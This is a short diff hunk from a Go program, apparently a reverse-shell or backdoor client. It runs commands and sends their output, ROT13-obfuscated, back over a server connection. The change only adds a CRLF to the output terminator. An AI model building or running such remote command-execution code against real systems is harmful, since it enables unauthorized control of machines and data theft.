@@ -112,7 +112,7 @@ func main() {
 							if err != nil {
 								fmt.Println("Error Executing command: ", err)
 							} else {
-								finalOutput := string(output) + "END_OF_OUTPUT"
+								finalOutput := string(output) + "END_OF_OUTPUT\r\n"
 
 								fmt.Fprintf(serverConn, rot13Encrypt(finalOutput))
 							}
